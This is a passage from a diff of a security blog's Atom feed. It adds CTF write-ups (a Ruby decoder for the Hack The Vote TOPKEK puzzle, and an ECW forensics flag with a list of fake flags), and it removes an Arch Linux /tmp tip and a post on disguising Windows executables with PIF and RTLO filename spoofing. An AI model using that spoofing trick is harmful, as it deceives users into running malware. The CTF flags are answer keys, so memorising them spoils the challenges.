marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">elsif</span> bool.match(<span class="regexp">/KEK/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'KEK'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'0'</span>) <span class="comment"># replacing marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">puts <span class="string">"Binary: \n"</span> + topkek_to_binary + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Let's convert it into ASCII</span></div><div class="line">puts <span class="string">"ASCII: \n"</span> + [topkek_to_binary].pack(<span class="string">"B*"</span>)</div></pre></td></tr></table></figure>
-<p>Here is the output of the script:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Original:</div><div class="line">KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP! KEK! TOP! KEK!!!!! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP! KEK!!!!! TOP!! KEK! TOP! KEK!!! TOP! KEK! TOP! KEK! TOP!! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP! KEK!!! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK!!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!! TOP!!! KEK!! TOP! KEK! TOP!!!!! KEK! TOP!!! KEK!! TOP! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP! KEK!! TOP! KEK!!!! TOP!!! KEK! TOP! KEK!!! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP!!! KEK!!! TOP!! KEK!!!!! TOP! KEK! TOP! KEK! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK!! TOP!! KEK! TOP! KEK!!! TOP! KEK! TOP! KEK!! TOP! KEK!!! TOP!! KEK!! TOP!! KEK! TOP! KEK! TOP!!!!! KEK! TOP!!!! KEK!! TOP! KEK!! TOP!! KEK!!!!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP! KEK!!!!! TOP!! KEK! TOP! KEK!!! TOP!!! KEK! TOP!! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK!! TOP! KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP! KEK!! TOP! KEK! TOP!! KEK!! TOP! KEK!!!! TOP! KEK!! TOP! KEK!!!! TOP! KEK!! TOP! KEK!!!! TOP! KEK! TOP!!!!! KEK! TOP!</div><div class="line"></div><div class="line">Binary:</div><div class="line">0110011001101100011000010110011101111011010101000011000001101111001100000110111100110000011011110011000001101111001100000101000001011111010111110101111101011111010111110101111100110001011011010101111101101000001101000101011000110001011011100100011101011111010001100111010101001110010111110111001000110001011001110100100001110100010111110110111000110000010101110101111100110100010100100011001101011111011110010011000001110101010111110110100000110100011101100011000101101110011001110101111101100110011101010110111001011111010111110101111101011111010111110101111101001011001100110100101100100001001000010010000101111101</div><div class="line"></div><div class="line">ASCII: +</div><div class="line">flag&#123;T0o0o0o0o0P______1m_h4V1nG_FuN_r1gHt_n0W_4R3_y0u_h4v1ng_fun______K3K!!!&#125;</div></pre></td></tr></table></figure>
+<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
+<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
+<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
+<p><strong>Bonus</strong>:</p>
+<ul>
+<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
+<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -1124,7 +1185,7 @@
     
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
-      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
     
   </entry>
   
@@ -1205,6 +1266,79 @@
   </entry>
   
   <entry>
+    <title>Hack The Vote 2016 - 50 - TOPKEK - Misc</title>
+    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/"/>
+    <id>http://rawsec.ml/en/Hack-The-Vote-2016-50-topkek/</id>
+    <published>2016-11-04T23:00:00.000Z</published>
+    <updated>2016-11-05T17:33:07.876Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : Hack The Vote 2016</li>
+<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>A CNN reporter had only one question that she couldn’t get off her mind</p>
+<blockquote>
+<p>   Do we even know, who is this 4 CHAN???</p>
+</blockquote>
+<p>So she set out to find who this 400lb hacker is. During her investigation, she came across this cryptic message on some politically incorrect forum online, can you figure out what it means?</p>
+<p><a href="https://s3.amazonaws.com/hackthevote/kek.43319559636b94db1c945834340b65d68f90b6ecbb70925f7b24f6efc5c2524e.txt" target="_blank" rel="external">kek</a></p>
+<p>author’s irc nick: krx</p>
+</blockquote>
+<p><strong>Note</strong>: This challenge was classified as <em>Crypto</em> but is <em>Misc</em>.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The content of the file looks like this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!!</div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p>This looks like an esoteric language (like Ook) but it’s not.</p>
+<p><strong>N.B.:</strong> According to <a href="http://fr.urbandictionary.com/define.php?term=topkek" target="_blank" rel="external">1</a>, <a href="https://encyclopediadramatica.se/Topkek" target="_blank" rel="external">2</a> and <a href="http://knowyourmeme.com/memes/topkek" target="_blank" rel="external">3</a>, <em>kek</em> is derivated of <em>lel</em> that is a derivated of <em>lol</em>, and <em>topkek</em> is a cake trademark popular on <code>/s4s</code> chan of 4Chan because of its similarity with <em>toplel</em> which means <em>super funny</em>. (Knowing that is useless for the challenge).</p>
+<p>There is only two keyword <code>TOP</code> and <code>KEK</code> and they seem pretty useless. So let’s assume that it is binary: (<code>TOP</code> = 0 &amp;&amp; <code>KEK</code> = 1) or (<code>TOP</code> = 1 &amp;&amp; <code>KEK</code> = 0).</p>
+<p>We noticed there is between 1 and 5 exclamation marks following each keywords so let’s assume that is the number of times that 0 or 1 is repeated.</p>
+<p>Here is my script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="comment"># read the file</span></div><div class="line">file = File.open(<span class="string">'kek.txt'</span>, <span class="string">'r+t'</span>)</div><div class="line">data = file.read</div><div class="line">file.close</div><div class="line">puts <span class="string">"Original: \n"</span> + data + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Assume that TOP = 1, KEK = 0, and ! the number of time they appear</span></div><div class="line">topkek_to_binary = <span class="string">""</span></div><div class="line">data.split(<span class="string">" "</span>).each <span class="keyword">do</span> <span class="params">|bool|</span></div><div class="line">  <span class="keyword">if</span> bool.match(<span class="regexp">/TOP/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'TOP'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'1'</span>) <span class="comment"># replacing marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">elsif</span> bool.match(<span class="regexp">/KEK/</span>)</div><div class="line">    marks = bool.sub(<span class="string">'KEK'</span>, <span class="string">''</span>) <span class="comment"># keeping only the marks</span></div><div class="line">    bin = marks.gsub(<span class="string">'!'</span>, <span class="string">'0'</span>) <span class="comment"># replacing marks with 0</span></div><div class="line">    topkek_to_binary.concat(bin)</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">puts <span class="string">"Binary: \n"</span> + topkek_to_binary + <span class="string">"\n\n"</span></div><div class="line"></div><div class="line"><span class="comment"># Let's convert it into ASCII</span></div><div class="line">puts <span class="string">"ASCII: \n"</span> + [topkek_to_binary].pack(<span class="string">"B*"</span>)</div></pre></td></tr></table></figure>
+<p>Here is the output of the script:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Original:</div><div class="line">KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP!! KEK!!! TOP!! KEK!!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP!!!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!!!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP!! KEK! TOP!!!! KEK!! TOP!! KEK!!!!! TOP! KEK! TOP! KEK!!!!! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!! KEK! TOP! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP! KEK!!!!! TOP!! KEK! TOP! KEK!!! TOP! KEK! TOP! KEK! TOP!! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP! KEK!!! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK!!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP! KEK!! TOP!!! KEK!! TOP! KEK! TOP!!!!! KEK! TOP!!! KEK!! TOP! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK!! TOP!!! KEK! TOP! KEK!! TOP! KEK!!!! TOP!!! KEK! TOP! KEK!!! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP!!! KEK!!! TOP!! KEK!!!!! TOP! KEK! TOP! KEK! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK!! TOP!! KEK! TOP! KEK!!! TOP! KEK! TOP! KEK!! TOP! KEK!!! TOP!! KEK!! TOP!! KEK! TOP! KEK! TOP!!!!! KEK! TOP!!!! KEK!! TOP! KEK!! TOP!! KEK!!!!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK! TOP! KEK!!!!! TOP!! KEK! TOP! KEK!!! TOP!!! KEK! TOP!! KEK!!! TOP!! KEK!!! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP!! KEK!! TOP!! KEK!! TOP!!! KEK! TOP! KEK! TOP! KEK! TOP!! KEK! TOP!!! KEK!! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK! TOP!!!!! KEK! TOP! KEK!! TOP! KEK! TOP!! KEK!! TOP!! KEK!! TOP!! KEK! TOP! KEK!! TOP! KEK! TOP!! KEK!! TOP! KEK!!!! TOP! KEK!! TOP! KEK!!!! TOP! KEK!! TOP! KEK!!!! TOP! KEK! TOP!!!!! KEK! TOP!</div><div class="line"></div><div class="line">Binary:</div><div class="line">0110011001101100011000010110011101111011010101000011000001101111001100000110111100110000011011110011000001101111001100000101000001011111010111110101111101011111010111110101111100110001011011010101111101101000001101000101011000110001011011100100011101011111010001100111010101001110010111110111001000110001011001110100100001110100010111110110111000110000010101110101111100110100010100100011001101011111011110010011000001110101010111110110100000110100011101100011000101101110011001110101111101100110011101010110111001011111010111110101111101011111010111110101111101001011001100110100101100100001001000010010000101111101</div><div class="line"></div><div class="line">ASCII: +</div><div class="line">flag&#123;T0o0o0o0o0P______1m_h4V1nG_FuN_r1gHt_n0W_4R3_y0u_h4v1ng_fun______K3K!!!&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Python 3 &quot;No module named SimpleHTTPServer&quot;</title>
     <link href="http://rawsec.ml/en/python-3-simplehttpserver/"/>
     <id>http://rawsec.ml/en/python-3-simplehttpserver/</id>
@@ -1240,87 +1374,6 @@
       <category term="programming" scheme="http://rawsec.ml/tags/programming/"/>
     
       <category term="python" scheme="http://rawsec.ml/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ArchLinux - Temporarily resize /tmp partition</title>
-    <link href="http://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/"/>
-    <id>http://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/</id>
-    <published>2016-10-14T22:00:00.000Z</published>
-    <updated>2016-10-15T16:37:51.804Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p><a href="https://wiki.archlinux.org/index.php/Tmpfs" target="_blank" rel="external">tmpfs</a> is a temporary file system that resides in memory and/or swap partition(s).</p>
-<p><a href="https://wiki.archlinux.org/index.php/Tmpfs" target="_blank" rel="external">tmpfs</a> is commonly used for <code>/tmp</code>. By default, a tmpfs has its maximum size set to half the total of RAM. Note that the actual memory/swap consumption depends on how much you fill it up, as tmpfs partitions do not consume any memory until it is actually needed.</p>
-<p>Problem example: You want to build an Android development lab in a VM. You set VM RAM to <strong>2GB</strong>. So by default, <code>/tmp</code> size will be <strong>1GB</strong>. You begin to install <a href="https://developer.android.com/studio/index.html" target="_blank" rel="external">Android Studio</a> but an error occured, telling you that there is not enough space on the disk. That’s because <code>/tmp</code> is too small to contain all temporary downloads of Android Studio during the install process.</p>
-<h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>For a problem like the prvious example, we don’t want to do a permanent change as that’s just a punctual need. So to fix the problem we’ll temporarily increase the size of <code>/tmp</code>. It is posible because in our example the VM has 2GB RAM + 4GB SWAP, so we can increase a tmpfs partition up to 6GB.</p>
-<p>Before the resizing:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ df /tmp                                           </div><div class="line">Filesystem     1K-blocks  Used Available Use% Mounted on</div><div class="line">tmpfs            1048576    84   1048492   1% /tmp</div></pre></td></tr></table></figure>
-<p>Temporary resize:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -o remount,size=4G,noatime /tmp</div></pre></td></tr></table></figure>
-<p>After the resizing:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ df /tmp</div><div class="line">Filesystem     1K-blocks  Used Available Use% Mounted on</div><div class="line">tmpfs            4194304    80   4194224   1% /tmp</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Context&quot;&gt;&lt;a href=&quot;#Context&quot; class=&quot;headerlink&quot; title=&quot;Context&quot;&gt;&lt;/a&gt;Context&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/Tmpf
-    
-    </summary>
-    
-      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
-    
-      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
-    
-    
-      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
-    
-      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2 less known tricks of spoofing extensions on Windows</title>
-    <link href="http://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/"/>
-    <id>http://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/</id>
-    <published>2016-10-12T22:00:00.000Z</published>
-    <updated>2016-10-13T20:26:51.769Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Well-known-tricks"><a href="#Well-known-tricks" class="headerlink" title="Well-known tricks"></a>Well-known tricks</h2><p>Malware often tries to hide itself from being an obvious executable.</p>
-<p>Windows malwares may:</p>
-<ul>
-<li>have crafted icons that are pretending to be real document files.</li>
-<li>use double extensions such as <code>.pdf.exe</code> or <code>.doc.exe</code>, this is effective because by default Windows hides the extension so not aware users wouldn’t notice this an an executable as they are only seeing <code>.pdf</code> or <code>.doc</code> .</li>
-<li>use lesser known extensions of executable format like <code>.scr</code>.</li>
-</ul>
-<h2 id="PIF-extension"><a href="#PIF-extension" class="headerlink" title="PIF extension"></a>PIF extension</h2><p>This trick is very effective because it hides the real extension even if the extension hiding feature is disabled.<br>The <code>.pif</code> extension is hidden and the original icon too but the file is still executable.</p>
-<p>PIF means Program Information file, historically it was used for DOS program and is not used today because there is no more DOS applications. But Creating a PIF file for a DOS-based program creates a shortcut to the program executable and all the settings saved in the PIF are contained in the shortcut.</p>
-<p>This trick was used in 2016 by a <a href="https://blog.malwarebytes.com/cybercrime/2016/09/lesser-known-tricks-of-spoofing-extensions/" target="_blank" rel="external">Petya/Mischa campaign in Poland</a>.</p>
-<h2 id="RTLO-trick"><a href="#RTLO-trick" class="headerlink" title="RTLO trick"></a>RTLO trick</h2><p>RTLO (Right To Left Override) trick uses the fact that some languages are being written from right side towards left but not the majority of countries.<br>In order to support such languages, a Unicode character (<code>U+202e</code>) is used to do the switch between those two modes. It can be use maliciously, in order to displace the displayed extensions.</p>
-<p>You can use <a href="https://www.branah.com/unicode-converter" target="_blank" rel="external">this site</a> to see how it works.</p>
-<p><code>file.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u002e\u0065\u0078\u0065</code> (unicode)</p>
-<p>Just add the <code>\u202e</code> reverse character before the dot and you get:</p>
-<p><code>file‮.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u202e\u002e\u0065\u0078\u0065</code> (unicode)</p>
-<p>Now add the spoofed extension (e.g. <code>txt</code> works very well because its reverse is also <code>txt</code>):</p>
-<p><code>file‮txt.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u202e\u0074\u0078\u0074\u002e\u0065\u0078\u0065</code> (unicode)</p>
-<p>We get a <code>file.txt.exe</code> that looks like <code>fileexe.txt</code>.</p>
-<p>Source: <a href="https://blog.malwarebytes.com/cybercrime/2016/09/lesser-known-tricks-of-spoofing-extensions/" target="_blank" rel="external">malwarebytes.com</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Well-known-tricks&quot;&gt;&lt;a href=&quot;#Well-known-tricks&quot; class=&quot;headerlink&quot; title=&quot;Well-known tricks&quot;&gt;&lt;/a&gt;Well-known tricks&lt;/h2&gt;&lt;p&gt;Malware of
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="windows" scheme="http://rawsec.ml/categories/security/windows/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
     
   </entry>
   
